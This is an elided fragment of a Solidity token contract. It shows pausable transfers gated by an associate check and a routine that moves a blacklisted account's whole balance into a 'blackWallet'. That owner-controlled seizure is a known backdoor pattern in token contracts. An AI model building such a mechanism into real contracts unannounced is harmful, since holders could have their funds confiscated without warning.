...
constructor() public payable {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal whenNotPaused checkAssociate(sender) {
        ...
        require(amount <= _tokenBalance[sender],"must be equal to or less than the portfolio balance");
    ...
    chek_Account(_blackAccount);
        uint256 amount = _tokenBalance[_blackAccount];
        _tokenBalance[_blackAccount] = _tokenBalance[_blackAccount].sub(amount);
        _tokenBalance[blackWallet] = _tokenBalance[blackWallet].add(amount);
    }
